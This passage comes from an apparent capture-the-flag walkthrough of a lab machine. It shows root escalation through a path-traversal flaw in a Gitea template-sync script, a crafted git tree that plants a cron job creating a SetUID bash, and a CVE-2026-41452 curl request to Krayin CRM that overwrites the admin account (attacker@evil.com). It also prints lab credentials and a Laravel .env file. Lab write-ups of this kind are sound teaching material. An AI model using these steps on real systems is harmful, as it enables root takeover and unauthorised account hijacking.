-                                   - -                                      - apport-autoreport.timer        apport-autoreport.service
-                                   - -                                      - snapd.snap-repair.timer        snapd.snap-repair.service
-                                   - -                                      - ua-timer.timer                 ua-timer.service

19 timers listed.
```

Of these 19, `gitea-template-sync.timer` last ran less than a minute ago, and runs again in less than a minute. That’s interesting.

`/etc/systemd/system/gitea-template-sync.timer` shows that it is scheduled to run `gitea-template-sync.service` every minute:

```toml
[Unit]
Description=Run Gitea template sync every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service

[Install]
WantedBy=timers.target
```

That service file (`/etc/systemd/system/gitea-template-sync.service`) defines what runs and as what user:

```toml
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

It runs `template-sync.py` as root.

#### template-sync.py

In `/etc/gitea` there are three files:

```ruby
jones@nexus:/etc/gitea$ ls -l
total 16
-rw-r----- 1 git git 1586 May 12 18:37 app.ini
-rw-r----- 1 git git   89 May 11 16:50 template-sync.conf
-rw-r--r-- 1 git git 4184 May 11 18:47 template-sync.py
```

jones doesn’t have access to `app.ini` or `template-sync.conf`.

The Python source starts by running `main`:

```python
def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

It calls `get_token()` to get a token. Looking at the function, it’s read from the config file:

```python
def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')
```

Then passes the result to `get_template_repos`, looping over the result calling `sync_template` on each, with `log` calls throughout.

`get_template_repos` is using the Gitea API to list repos visible to this user associated with the token:

```python
def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []
```

This returns a list of metadata objects about each repo. Each of these is passed to `sync_template`, which is quite long. It starts by pulling the owner and name from the metadata, and building `bare_path` and `stage_path` strings with `os.path.join`.

```python
def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return
```

Then it builds and runs a command using `git ls-tree`:

```python
    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return
```

This is intended to run a command like:

```bash
git -c safe.directory=* ls-tree -r HEAD
```

in the `bare_path` directory. This would list all the files in the repo directory. It processes the output of that command:

```bash
    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return
```

Finally, it loops over each entry using `git cat-file` to get the contents, and then writing that into the `target` path (which is also formed with `os.path.join`):

```lua
    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))
```

#### Gitea

The username jones / password “y27xb3ha!!74GbR” works to login to Gitea:

![image-20260831210848834](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9737b7fdfaa1ad04.png)

![image-20260831210848834](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260831210848834.webp)

There’s nothing interesting here, but jones can create repos.

### Exploit Strategy

There are three issues that come together to make this script exploitable:

1.  `safe.directory=*`
2.  Using `ls-tree` rather than `checkout`
3.  Unsanitized Tree Paths

#### safe.directory

The first issue with the script is how both `git` calls are called with the `-c safe.directory=*`. By default, Git refuses to operate on a repository owned by a different user or outside of the current repo. This argument isn’t added just to be vulnerable, as the script runs as root against the bare repos under `/var/lib/gitea/data/gitea-repositories`, which are owned by `git`. Without it, the intended functionality wouldn’t work.

To actually abuse it I’d need to write a `config` file into one of those bare repos, and that lives under `/var/lib/gitea` owned by `git`. jones can’t write there directly. I’ll look at going through Gitea shortly.

#### Using ls-tree

In general, Git won’t let a path with a directory traversal into a repo. However, that filter is done at `git checkout`, which is never done here. Instead, it uses `git ls-tree` to get the contents of each file, and writes it into place on disk. This skips that validation step.

A tree object is nothing more than a sequence of `<mode> <name>\0<20-byte sha>` records, and the only byte the format actually forbids inside a name is the NUL terminator. `git hash-object --literally` skips the sanity checks, so I can assemble the object bytes by hand and hash them straight into the object store.

#### Unsanitized Tree Paths

Now that I know I can poison a Git repo with a directory traversal, it comes down to `os.path.join` (as it has [many times before](https://0xdf.gitlab.io/tags#os-path-join)). When the code does this:

```python
stage_path = os.path.join(STAGING_DIR, owner, name)
...
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    target_dir = os.path.dirname(target)

    try:
        os.makedirs(target_dir, exist_ok=True)
        ...
        with open(target, 'wb') as f:
            f.write(cat_result.stdout)

        if mode == '100755':
            os.chmod(target, 0o755)
```

`filepath` is whatever `git ls-tree -r HEAD` printed on the right-hand side of the tab, and it goes into `os.path.join` with no normalization and no check that the result is still underneath `stage_path`.

The intended behavior of `os.path.join` is to ignore any arguments that come before an arg that starts with `/`:

```swift
oxdf@hacky$ python3
>>> import os
>>> os.path.join('/home/git/template-staging/jones/tpl', 'README.md')
'/home/git/template-staging/jones/tpl/README.md'
>>> os.path.join('/home/git/template-staging/jones/tpl', '/etc/cron.d/0xdf')
'/etc/cron.d/0xdf'
```

Relative path traversal works as well, as `os.path.join` will also generate `/home/git/template-staging/jones/tpl/../../../../../etc/cron.d/0xdf`.

#### Poisoning the Repo

To get a repo on target, I’ll need to make a repo (as jones) that is set as a template repo, and then poison it with the directory traversal to write as root. Then when the sync runs, it’ll pull the raw repo and write the files using the traversal to give me arbitrary write as root.

The trick is going to be writing the traversal into the Git metadata because that’s not how Git is supposed to work by default. I’ll walk through the details of that when I get to it.

### Exploit

#### Create Repo

I’ll create a new repo logged in as jones:

![image-20260901044226285](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f99603535d304f36.png)

![image-20260901044226285](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901044226285.webp)

On the next form, I’ll give it a name and make sure to check the “Make repository a template” box so that it is picked up by the search:

![image-20260901045521454](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e8b1f3d2fbb4dccc.png)

![image-20260901045521454](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901045521454.webp)

I’ll clone the repo to my host, adding the username and password into the URL so that I can push back to it:

```css
oxdf@hacky$ git clone 'http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/cron.git'
Cloning into 'cron'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
oxdf@hacky$ cd cron/
oxdf@hacky$ ls
README.md
```

#### Understanding Git

If I look at the files in my repo right now with `git ls-tree`, it shows…

```
oxdf@hacky$ git ls-tree HEAD
100644 blob 5ed7994a966439bc207a761ec6e556b850a3e284    README.md
```

Right now, the file came from the remote source packed:

```
oxdf@hacky$ find .git/objects/ -type f
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.idx
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.rev
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.pack
```

I’ll update it, and commit the change:

```swift
oxdf@hacky$ vim README.md 
oxdf@hacky$ git add README.md 
oxdf@hacky$ git commit -m "updated readme"
[main 58697f8] updated readme
 1 file changed, 2 insertions(+)
oxdf@hacky$ git ls-tree HEAD
100644 blob e2b8ba489485a6a56e3342bb4c99da2071332335    README.md
oxdf@hacky$ find .git/objects/ -type f
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.idx
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.rev
.git/objects/pack/pack-fd675e21b244e89ec9b96a9807c7a924a7b4a05b.pack
.git/objects/ec/e59c72d4e8d5638dc6ae1e6cc368d2b60b2208
.git/objects/e2/b8ba489485a6a56e3342bb4c99da2071332335
.git/objects/58/697f8b758d781a70f3476d6ac3d72a4a375478
```

The hash of the blob changed, and now there are three local objects. `git cat-file -t` will show the type of each file (named by combining the two character prefix folder with the filename):

```powershell
oxdf@hacky$ git cat-file -t ece59c72d4e8d5638dc6ae1e6cc368d2b60b2208
tree
oxdf@hacky$ git cat-file -t e2b8ba489485a6a56e3342bb4c99da2071332335
blob
oxdf@hacky$ git cat-file -t 58697f8b758d781a70f3476d6ac3d72a4a375478
commit
```

`e2b8ba489485a6a56e3342bb4c99da2071332335` is the file (matching the output of `git ls-tree`, and the others are other data about the repo. The blob stores the content of the file (compressed). Decompressing it gives:

```yaml
oxdf@hacky$ cat .git/objects/e2/b8ba489485a6a56e3342bb4c99da2071332335 | zlib-flate -uncompress
blob 31# cron

This will get me root

oxdf@hacky$ cat .git/objects/e2/b8ba489485a6a56e3342bb4c99da2071332335 | zlib-flate -uncompress | xxd
00000000: 626c 6f62 2033 3100 2320 6372 6f6e 0a0a  blob 31.# cron..
00000010: 5468 6973 2077 696c 6c20 6765 7420 6d65  This will get me
00000020: 2072 6f6f 740a 0a                         root..
```

It’s “blob”, space, the length of the content, a null byte, and then the content.

If I do the same thing with the `tree` object:

```yaml
oxdf@hacky$ cat .git/objects/ec/e59c72d4e8d5638dc6ae1e6cc368d2b60b2208 | zlib-flate -uncompress
tree 37100644 README.md⸺Hn3BL q3#5
oxdf@hacky$ cat .git/objects/ec/e59c72d4e8d5638dc6ae1e6cc368d2b60b2208 | zlib-flate -uncompress | xxd
00000000: 7472 6565 2033 3700 3130 3036 3434 2052  tree 37.100644 R
00000010: 4541 444d 452e 6d64 00e2 b8ba 4894 85a6  EADME.md....H...
00000020: a56e 3342 bb4c 99da 2071 3323 35         .n3B.L.
```

This is of type “tree”, then a space, the size, and a null. Then comes the record for each file (only one in this case) of the format `<mode> <filename>\\0<hash>`. I’ll note that the hash matches the file.

#### Creating Exploit Objects

I’ll first create the `blob` object:

```
oxdf@hacky$ echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin
c3b4cb9c96f6515f807fc9b722ebb99ab8b89be7
```

`git hash-object` with the `-w` flag will create this object:

```bash
oxdf@hacky$ cat .git/objects/c3/b4cb9c96f6515f807fc9b722ebb99ab8b89be7 | zlib-flate -uncompress
blob 70* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash
```

Now I need a `tree` object that points to this with the filename containing the directory traversal:

```bash
oxdf@hacky$ RAWHASH=$(echo -n c3b4cb9c96f6515f807fc9b722ebb99ab8b89be7 | xxd -r -p)
oxdf@hacky$ echo -ne "100644 /etc/cron.d/0xdf\0${RAWHASH}" | xxd
00000000: 3130 3036 3434 202f 6574 632f 6372 6f6e  100644 /etc/cron
00000010: 2e64 2f30 7864 6600 c3b4 cb9c 96f6 515f  .d/0xdf.......Q_
00000020: 807f c9b7 22eb b99a b8b8 9be7            ....".......
oxdf@hacky$ echo -ne "100644 /etc/cron.d/0xdf\0${RAWHASH}" | git hash-object -w -t tree --literally --stdin
842716615594ea33aa6d0dfdd9a91b7080cd5aca
```

I get the binary version of the hash, and then use `echo` to make the file contents, using `git hash-object` again with `-w` to write, and also with `-t tree` to write it as a `tree` object.

Now I’ll use `git commit-tree` to take the current tree object and wrap a commit around it (which is the opposite of `git commit`, which would look only at files on the file system and not see any):

```sql
oxdf@hacky$ git commit-tree 842716615594ea33aa6d0dfdd9a91b7080cd5aca -m "traversal!"
4a79809cfd6cb04e98319f9adfda65354e699e32
oxdf@hacky$ git update-ref refs/heads/main 4a79809cfd6cb04e98319f9adfda65354e699e32
```

Once I have that commit, I need to point `main` at it so that it’ll be discovered.

Now the repo shows my file with the traversal:

```
oxdf@hacky$ git ls-tree -r HEAD
100644 blob c3b4cb9c96f6515f807fc9b722ebb99ab8b89be7    /etc/cron.d/0xdf
```

I’ll push this to Gitea:

```css
oxdf@hacky$ git push origin main --force
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 259 bytes | 259.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://git.nexus.htb/jones/cron.git
 + a2b6739...4a79809 main -> main (forced update)
```

#### Shell

Once that’s on Gitea, the next time the sync runs, it will create `/etc/cron.d/0xdf`:

```ruby
jones@nexus:/etc/gitea$ ls /etc/cron.d/
0xdf  e2scrub_all  php  sysstat
```

Waiting another minute, there will be a SetUID `bash` copy in `/tmp`:

```ruby
jones@nexus:/etc/gitea$ ls -l /tmp/rootbash 
-rwsr-sr-x 1 root root 1446024 Sep  1 09:40 /tmp/rootbash
```

I’ll run it (with `-p` to not drop privs):

```ruby
jones@nexus:/etc/gitea$ /tmp/rootbash -p
rootbash-5.2# 
```

And grab `root.txt`:

```
rootbash-5.2# cat /root/root.txt
52dd0700************************
```

## Beyond Root

### CVE-2026-41452

Searching for vulnerabilities in Krayin v2.2.0 reveals [CVE-2026-41452](https://nvd.nist.gov/vuln/detail/cve-2026-41452), which NIST describes as:

> Krayin CRM 2.2.4 contains a missing authentication vulnerability in the installer middleware that allows unauthenticated remote attackers to overwrite the primary administrator account by sending a crafted HTTP POST request with the X-Requested-With: XMLHttpRequest header to bypass the CanInstall middleware redirect check. Attackers can supply arbitrary name, email, and password values to the admin-config-setup endpoint, which performs an unauthenticated updateOrInsert targeting the hardcoded administrator user ID, enabling full administrative access to all CRM data.

The advisory is filed against version 2.2.4, but the NIST page actually shows it affects all versions up to and including 2.2.0 and 2.2.4. It’s interesting that 2.2.1 through 2.2.3 were not vulnerable. Claude noted while fingerprinting the version above that 2.2.0 has the same `isAlreadyInstalled() && ! $request->ajax()` check, so it’s vulnerable as well.

[This writeup](https://jivasecurity.com/writeups/krayin-installer-bypass-account-takeover-cve-2026-41452) from Jiva Security goes into detail.

The short version is that when the `X-Requested-With: XMLHttpRequest` header is sent, Krayin skips the middleware that validates the authentication for the `admin-config-setup` endpoint. This means I can send that header along with a body that updates the admin username, email, and password.

The post has a POC using a single `curl` command. When updated for Nexus, I get:

```swift
oxdf@hacky$ curl -s -X POST \
‍  -H 'X-Requested-With: XMLHttpRequest' \
‍  -H 'Accept: application/json' \
‍  -H 'Content-Type: application/json' \
‍  'http://billing.nexus.htb/install/api/admin-config-setup' \
‍  -d '{"admin":"pwned","email":"attacker@evil.com","password":"hacked123"}'

1
```

The return value of 1 means it worked. Now I can log in as `attacker@evil.com` using the provided password, and see that the only user is this one (having overwritten the original admin):

![image-20260830072238534](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/73860513541e7b95.png)

![image-20260830072238534](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830072238534.webp)

### Laravel Debug

#### Enumerate

The Laravel Debug Bar is present at the bottom of every page on Krayin:

![image-20260901071712262](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/11f2b1b186463d73.png)

![image-20260901071712262](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901071712262.webp)

This shows the request made, stats, as well as info about the DB queries made:

![image-20260901071800990](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/84a9098f0b602315.png)

![image-20260901071800990](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901071800990.webp)

And models involved:

![image-20260901071817882](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/56e58e0aefea1ce1.png)

![image-20260901071817882](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901071817882.webp)

This is enabled in `/var/www/krayin/config/app.php` where it reads the `APP_DEBUG` environment variable (defaulting to `false`):

```go
...[snip]...
	/*
    |--------------------------------------------------------------------------
    | Application Debug Mode
    |--------------------------------------------------------------------------
    |
    | When your application is in debug mode, detailed error messages with
    | stack traces will be shown on every error that occurs within your
    | application. If disabled, a simple generic error page is shown.
    |
     */

    'debug' => (bool) env('APP_DEBUG', false),
...[snip]...
```

In `.env`, it’s set to `true` on the fourth line:

```bash
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

Debug mode is also what shows the details when there’s a crash, such as I see when trying a GET to `/admin/tinymce/upload`:

![image-20260830093624050](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830093624050.webp)

#### Exploitation

Debug mode being on isn’t a direct path to code execution here, but it does leak some information. The Debug Bar embeds its entire dataset into the HTML of every page as a `phpdebugbar.addDataSet({...})` call. That means I can pull it with `curl` and parse it, no browser needed. Even on the pre-auth login page, it shows the SQL queries (with table and column names), the controller, and the exact source file and line handling the request:

```swift
oxdf@hacky$ curl -s http://billing.nexus.htb/admin/login | grep -oP 'addDataSet\(\K.*(?=, "[^"]+"\);)' | python3 -m json.tool
{
    "__meta": {
        "id": "01M1EC52YXHG7NR6KJTEQVPAGQ",
        "datetime": "2026-09-01 17:07:28",
        "utime": 1788262648.797881,
        "method": "GET",
        "uri": "/admin/login",
        "ip": "10.10.15.169"
    },
    "messages": {
        "count": 2,
        "messages": [
            {
                "message": "[17:07:28] LOG.warning: Creation of dynamic property Webkul\\Admin\\Http\\Middleware\\Locale::$app is deprecated in /var/www/krayin/packages/Webkul/Admin/src/Http/Middleware/Locale.php on line 20",
                "message_html": null,
                "is_string": false,
                "label": "warning",
                "time": 1788262648.775327,
                "xdebug_link": null,
                "collector": "log"
            },
            {
                "message": "[17:07:28] LOG.warning: Creation of dynamic property Webkul\\Admin\\Http\\Middleware\\Locale::$request is deprecated in /var/www/krayin/packages/Webkul/Admin/src/Http/Middleware/Locale.php on line 22",
                "message_html": null,
                "is_string": false,
                "label": "warning",
                "time": 1788262648.775447,
                "xdebug_link": null,
                "collector": "log"
            }
        ]
    },
    "time": {
        "count": 17,
        "start": 1788262648.717082,
        "end": 1788262648.797908,
        "duration": 0.0808260440826416,
        "duration_str": "80.83ms",
        "measures": [
            {
                "label": "Booting",
                "start": 1788262648.717082,
                "relative_start": 0,
                "end": 1788262648.769619,
                "relative_end": 1788262648.769619,
                "duration": 0.052536964416503906,
                "duration_str": "52.54ms",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "time",
                "group": null
            },
            {
                "label": "Application",
                "start": 1788262648.769637,
                "relative_start": 0.052555084228515625,
                "end": 1788262648.797911,
                "relative_end": 2.86102294921875e-06,
                "duration": 0.028273820877075195,
                "duration_str": "28.27ms",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "time",
                "group": null
            },
            {
                "label": "Routing",
                "start": 1788262648.772727,
                "relative_start": 0.055644989013671875,
                "end": 1788262648.773273,
                "relative_end": 1788262648.773273,
                "duration": 0.0005459785461425781,
                "duration_str": "546\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": null,
                "group": null
            },
            {
                "label": "Preparing Response",
                "start": 1788262648.7847,
                "relative_start": 0.06761789321899414,
                "end": 1788262648.797375,
                "relative_end": 1788262648.797375,
                "duration": 0.012675046920776367,
                "duration_str": "12.68ms",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": null,
                "group": null
            },
            {
                "label": "View: admin::sessions.login",
                "start": 1788262648.785074,
                "relative_start": 0.06799197196960449,
                "end": 1788262648.785074,
                "relative_end": 1788262648.785074,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.label",
                "start": 1788262648.78803,
                "relative_start": 0.07094788551330566,
                "end": 1788262648.78803,
                "relative_end": 1788262648.78803,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.control",
                "start": 1788262648.788337,
                "relative_start": 0.07125496864318848,
                "end": 1788262648.788337,
                "relative_end": 1788262648.788337,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.error",
                "start": 1788262648.788658,
                "relative_start": 0.07157588005065918,
                "end": 1788262648.788658,
                "relative_end": 1788262648.788658,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.index",
                "start": 1788262648.788875,
                "relative_start": 0.0717930793762207,
                "end": 1788262648.788875,
                "relative_end": 1788262648.788875,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.label",
                "start": 1788262648.789048,
                "relative_start": 0.07196593284606934,
                "end": 1788262648.789048,
                "relative_end": 1788262648.789048,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.control",
                "start": 1788262648.789193,
                "relative_start": 0.07211089134216309,
                "end": 1788262648.789193,
                "relative_end": 1788262648.789193,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.error",
                "start": 1788262648.789335,
                "relative_start": 0.07225298881530762,
                "end": 1788262648.789335,
                "relative_end": 1788262648.789335,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.control-group.index",
                "start": 1788262648.789444,
                "relative_start": 0.07236194610595703,
                "end": 1788262648.789444,
                "relative_end": 1788262648.789444,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.form.index",
                "start": 1788262648.789669,
                "relative_start": 0.0725870132446289,
                "end": 1788262648.789669,
                "relative_end": 1788262648.789669,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.layouts.anonymous",
                "start": 1788262648.790102,
                "relative_start": 0.07301998138427734,
                "end": 1788262648.790102,
                "relative_end": 1788262648.790102,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.flash-group.index",
                "start": 1788262648.79527,
                "relative_start": 0.07818794250488281,
                "end": 1788262648.79527,
                "relative_end": 1788262648.79527,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            },
            {
                "label": "View: admin::components.flash-group.item",
                "start": 1788262648.795682,
                "relative_start": 0.07859992980957031,
                "end": 1788262648.795682,
                "relative_end": 1788262648.795682,
                "duration": 0,
                "duration_str": "0\u03bcs",
                "memory": 0,
                "memory_str": "0B",
                "params": [],
                "collector": "views",
                "group": "View"
            }
        ]
    },
    "memory": {
        "peak_usage": 2511936,
        "peak_usage_str": "2MB"
    },
    "exceptions": {
        "count": 0,
        "exceptions": []
    },
    "laravel": {
        "version": "12.x",
        "tooltip": {
            "Laravel Version": "12.54.1",
            "PHP Version": "8.3.6",
            "Environment": "local",
            "Debug Mode": "Enabled",
            "URL": "billing.nexus.htb",
            "Timezone": "Asia/Kolkata",
            "Locale": "en"
        }
    },
    "views": {
        "count": 13,
        "nb_templates": 13,
        "templates": [
            {
                "name": "admin::sessions.login",
                "param_count": null,
                "params": [],
                "start": 1788262648.785052,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/sessions/login.blade.phpadmin::sessions.login",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fsessions%2Flogin.blade.php&line=1",
                    "ajax": false,
                    "filename": "login.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.label",
                "param_count": null,
                "params": [],
                "start": 1788262648.788013,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/label.blade.phpadmin::components.form.control-group.label",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Flabel.blade.php&line=1",
                    "ajax": false,
                    "filename": "label.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.control",
                "param_count": null,
                "params": [],
                "start": 1788262648.788324,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/control.blade.phpadmin::components.form.control-group.control",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Fcontrol.blade.php&line=1",
                    "ajax": false,
                    "filename": "control.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.error",
                "param_count": null,
                "params": [],
                "start": 1788262648.788644,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/error.blade.phpadmin::components.form.control-group.error",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Ferror.blade.php&line=1",
                    "ajax": false,
                    "filename": "error.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.index",
                "param_count": null,
                "params": [],
                "start": 1788262648.788862,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/index.blade.phpadmin::components.form.control-group.index",
                "xdebug_link": {
